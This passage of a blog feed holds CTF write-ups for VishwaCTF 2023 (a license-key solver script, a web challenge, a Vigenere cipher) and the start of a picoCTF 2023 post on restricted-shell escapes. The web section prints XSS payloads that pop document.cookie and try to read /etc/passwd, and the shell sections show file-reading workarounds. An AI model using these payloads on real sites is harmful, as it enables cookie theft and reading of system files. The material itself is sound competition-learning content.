&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;False
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;key[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;hashlib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sha256&lt;&#x2F;span&gt;&lt;span&gt;(username_trial)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;hexdigest&lt;&#x2F;span&gt;&lt;span&gt;()[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;False
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;key[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;hashlib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sha256&lt;&#x2F;span&gt;&lt;span&gt;(username_trial)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;hexdigest&lt;&#x2F;span&gt;&lt;span&gt;()[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;]:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;False
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;True
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The key&#x2F;license characters are compared with the hash characters of the &lt;code&gt;username_trail&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;username_trail = username_trial = b&quot;vishwaCTF&quot; hashlib.sha256(username_trial).hexdigest() = a1ccb7d574518024795268ab284efdd93787b7cb741038437f24bff749a7aa0c &lt;&#x2F;code&gt;
Now the &lt;code&gt;key[0] = hashlib.sha256(username_trial).hexdigest()[4] = b&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;So, i wrote this script to print the flag rather than doing it manually.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;hashlib
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;cryptography&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;fernet &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;Fernet
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;base64
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;username_trial &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;vishwaCTF&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;key_part_static1_trial &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;VishwaCTF{m4k3_it_possibl3_&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;key_part_dynamic1_trial &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;xxxxxxxx&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;key_part_static2_trial &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;}&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;[]
&lt;&#x2F;span&gt;&lt;span&gt;index &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;7&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;index:
&lt;&#x2F;span&gt;&lt;span&gt;    key&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(hashlib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sha256&lt;&#x2F;span&gt;&lt;span&gt;(username_trial)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;hexdigest&lt;&#x2F;span&gt;&lt;span&gt;()[i])
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;key_part_dynamic1_trial &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;join&lt;&#x2F;span&gt;&lt;span&gt;(key)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;key_full_template_trial &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;key_part_static1_trial &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;key_part_dynamic1_trial &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;key_part_static2_trial
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(key_full_template_trial)
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#output
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#VishwaCTF{m4k3_it_possibl3_b7cdc517}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : VishwaCTF{m4k3_it_possibl3_b7cdc517}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;web-alive&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#web-alive&quot; aria-label=&quot;Anchor link for: web-alive&quot;&gt;WEB-aLive&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;vishwa23&#x2F;vishwa_alive1.png&quot; alt=&quot;Alive&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The website that is given in challenge is checking the live hosts.&lt;&#x2F;p&gt;
&lt;p&gt;I tried to insert some html code in the input.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;vishwa23&#x2F;vishwa_alive2.png&quot; alt=&quot;Alive&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;As i expected the site was processed the html code.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;vishwa23&#x2F;vishwa_alive3.png&quot; alt=&quot;Alive&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;So , it seems to have a &lt;code&gt;Reflected XSS&lt;&#x2F;code&gt; vulnerability. I tried multiple payloads to done my work.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;&#x27;);&amp;lt;&#x2F;script&amp;gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;&#x2F;script&amp;gt;&amp;lt;b&amp;gt;&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;&#x27;,&amp;lt;&#x2F;script&amp;gt;&amp;lt;script&amp;gt;x=new XMLHttpRequest; alert(this.responseText); x.open(&quot;GET&quot;,&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;); x.send()&amp;lt;&#x2F;script&amp;gt;;&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Sadly, They are not worked. But I just tried to access &lt;code&gt;&#x2F;flag.txt&lt;&#x2F;code&gt; of the site from the searchbar. And surprisingly it returned the flag.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;vishwa23&#x2F;vishwa_alive4.png&quot; alt=&quot;Alive&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I dont know wheather it is intended or not, but many teams solved it in this way only!&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : VishwaCTF{blinD_cmd-i}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;crypto-indecipherable-cipher&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#crypto-indecipherable-cipher&quot; aria-label=&quot;Anchor link for: crypto-indecipherable-cipher&quot;&gt;Crypto-Indecipherable Cipher&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;vishwa23&#x2F;vishwa_indecipher1.png&quot; alt=&quot;Indecipherable&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;First, I used &lt;a href=&quot;https:&#x2F;&#x2F;www.dcode.fr&#x2F;cipher-identifier&quot; target=_blank&gt;this site&lt;&#x2F;a&gt; to identify the cipher type. It shows that it is mostly a vigenere cipher. Then i used &lt;a href=&quot;https:&#x2F;&#x2F;www.dcode.fr&#x2F;vigenere-cipher&quot; target=_blank&gt;this site&lt;&#x2F;a&gt; to decode the cipher.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;vishwa23&#x2F;vishwa_indecipher2.png&quot; alt=&quot;Indecipherable&quot; &#x2F;&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;vishwa23&#x2F;vishwa_indecipher3.png&quot; alt=&quot;Indecipherable&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The flag is the decrypted text in format.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : VishwaCTF{friedrichwilhelmkasiskiwastheonewhodesignedtheaaakasiskiexaminationtodecodevignerecipher}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Pico CTF 2023</title>
        <published>2023-04-02T00:00:00+00:00</published>
        <updated>2023-04-02T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/writeups/picoctf23/"/>
        <id>https://themj0ln1r.github.io/writeups/picoctf23/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/writeups/picoctf23/">&lt;p&gt;Hello guys! I played &lt;a href=&quot;https:&#x2F;&#x2F;play.picoctf.org&#x2F;events&#x2F;72&quot; target=_blank&gt;picoCTF 2023&lt;&#x2F;a&gt; competition (&quot;picoCTF 2023&quot; or the &quot;Competition&quot;) organized by Carnegie Mellon University (&quot;CMU&quot;). I scored 3000+ points in this CTF. These are the challenges i solved during the CTF.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;h3 id=&quot;general-skills&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#general-skills&quot; aria-label=&quot;Anchor link for: general-skills&quot;&gt;General Skills&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;chrono&lt;&#x2F;li&gt;
&lt;li&gt;money-ware&lt;&#x2F;li&gt;
&lt;li&gt;permissions&lt;&#x2F;li&gt;
&lt;li&gt;repitiotions&lt;&#x2F;li&gt;
&lt;li&gt;useless&lt;&#x2F;li&gt;
&lt;li&gt;special&lt;&#x2F;li&gt;
&lt;li&gt;specialer&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;h3 id=&quot;forensics&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#forensics&quot; aria-label=&quot;Anchor link for: forensics&quot;&gt;Forensics&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;hideme&lt;&#x2F;li&gt;
&lt;li&gt;PcapPoisoning&lt;&#x2F;li&gt;
&lt;li&gt;who is it&lt;&#x2F;li&gt;
&lt;li&gt;FindAndOpen&lt;&#x2F;li&gt;
&lt;li&gt;MSB&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;h3 id=&quot;reverse-engineering&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#reverse-engineering&quot; aria-label=&quot;Anchor link for: reverse-engineering&quot;&gt;Reverse Engineering&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;Ready Gladiator 0&lt;&#x2F;li&gt;
&lt;li&gt;Reverse&lt;&#x2F;li&gt;
&lt;li&gt;Safe Opener 2&lt;&#x2F;li&gt;
&lt;li&gt;timer&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;h3 id=&quot;web-exploitation&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#web-exploitation&quot; aria-label=&quot;Anchor link for: web-exploitation&quot;&gt;Web Exploitation&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;FindMe&lt;&#x2F;li&gt;
&lt;li&gt;MatchTheRegex&lt;&#x2F;li&gt;
&lt;li&gt;SOAP&lt;&#x2F;li&gt;
&lt;li&gt;More SQLi&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;h3 id=&quot;cryptography&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#cryptography&quot; aria-label=&quot;Anchor link for: cryptography&quot;&gt;Cryptography&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;HideToSee&lt;&#x2F;li&gt;
&lt;li&gt;ReadMyCert&lt;&#x2F;li&gt;
&lt;li&gt;Rotation&lt;&#x2F;li&gt;
&lt;li&gt;SRA&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;h3 id=&quot;binary-exploitation&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#binary-exploitation&quot; aria-label=&quot;Anchor link for: binary-exploitation&quot;&gt;Binary Exploitation&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;two-sum&lt;&#x2F;li&gt;
&lt;li&gt;VNE&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Most of these are basic challenges, so I would like to explain few challenges which are interested me.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;special&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#special&quot; aria-label=&quot;Anchor link for: special&quot;&gt;Special&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;pico23&#x2F;pico23_special.png&quot; alt=&quot;Special&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;As suggested i used ssh to login to the special machine. And i tried some commands there but those are spell checked by the machine and it results an error to execute the commands. I tries piping technique together with cat command to find the flag location and print out.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;Special$ ls
&lt;&#x2F;span&gt;&lt;span&gt;Is 
&lt;&#x2F;span&gt;&lt;span&gt;sh: 1: Is: not found
&lt;&#x2F;span&gt;&lt;span&gt;Special$ cat *
&lt;&#x2F;span&gt;&lt;span&gt;Cat * 
&lt;&#x2F;span&gt;&lt;span&gt;sh: 1: Cat: not found
&lt;&#x2F;span&gt;&lt;span&gt;Special$ cat | cat *
&lt;&#x2F;span&gt;&lt;span&gt;Cat | cat * 
&lt;&#x2F;span&gt;&lt;span&gt;sh: 1: Cat: not found
&lt;&#x2F;span&gt;&lt;span&gt;cat: blargh: Is a directory
&lt;&#x2F;span&gt;&lt;span&gt;Special$ cat | cat blargh&#x2F;*
&lt;&#x2F;span&gt;&lt;span&gt;Cat | cat blargh&#x2F;* 
&lt;&#x2F;span&gt;&lt;span&gt;sh: 1: Cat: not found
&lt;&#x2F;span&gt;&lt;span&gt;picoCTF{5p311ch3ck_15_7h3_w0r57_6a2763f6}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : picoCTF{5p311ch3ck_15_7h3_w0r57_6a2763f6}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;specialer&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#specialer&quot; aria-label=&quot;Anchor link for: specialer&quot;&gt;Specialer&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;pico23&#x2F;pico23_specialer.png&quot; alt=&quot;Special&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;It is similar to the special challenge. Logged into challenge machine and tried few commands to execute.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;ctf-player@saturn.picoctf.net&amp;#39;s password: 
&lt;&#x2F;span&gt;&lt;span&gt;Specialer$ ls
&lt;&#x2F;span&gt;&lt;span&gt;-bash: ls: command not found
&lt;&#x2F;span&gt;&lt;span&gt;Specialer$ echo *
&lt;&#x2F;span&gt;&lt;span&gt;abra ala sim
&lt;&#x2F;span&gt;&lt;span&gt;Specialer$ echo abra&#x2F;*     
&lt;&#x2F;span&gt;&lt;span&gt;abra&#x2F;cadabra.txt abra&#x2F;cadaniel.txt
&lt;&#x2F;span&gt;&lt;span&gt;Specialer$ echo ala&#x2F;*
&lt;&#x2F;span&gt;&lt;span&gt;ala&#x2F;kazam.txt ala&#x2F;mode.txt
&lt;&#x2F;span&gt;&lt;span&gt;Specialer$ echo sim&#x2F;*
&lt;&#x2F;span&gt;&lt;span&gt;sim&#x2F;city.txt sim&#x2F;salabim.txt
&lt;&#x2F;span&gt;&lt;span&gt;Specialer$ 
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Using echo I discovered the files present in the machine. Tried to read abra&#x2F;cadabra.txt with echo. It is not the flag, and the flag is present in the ala&#x2F;kazam.txt.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;Specialer$ echo &amp;quot;$(&amp;lt;abra&#x2F;cadabra.txt)&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;Nothing up my sleeve!
&lt;&#x2F;span&gt;&lt;span&gt;Specialer$ echo &amp;quot;$(&amp;lt;ala&#x2F;kazam.txt)&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;return 0 picoCTF{y0u_d0n7_4ppr3c1473_wh47_w3r3_d01ng_h3r3_38f5cc78}
&lt;&#x2F;span&gt;&lt;span&gt;Specialer$ 
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : picoCTF{y0u_d0n7_4ppr3c1473_wh47_w3r3_d01ng_h3r3_38f5cc78}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;two-sum&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#two-sum&quot; aria-label=&quot;Anchor link for: two-sum&quot;&gt;two-sum&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;pico23&#x2F;pico23_twosum.png&quot; alt=&quot;two-sum&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The source code of the challenge:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;lt;stdio.h&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;lt;stdlib.h&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;static int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;addIntOvf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;result&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    result &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt; b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;amp;&amp;amp;&lt;&#x2F;span&gt;&lt;span&gt; b &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;amp;&amp;amp;&lt;&#x2F;span&gt;&lt;span&gt; result &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
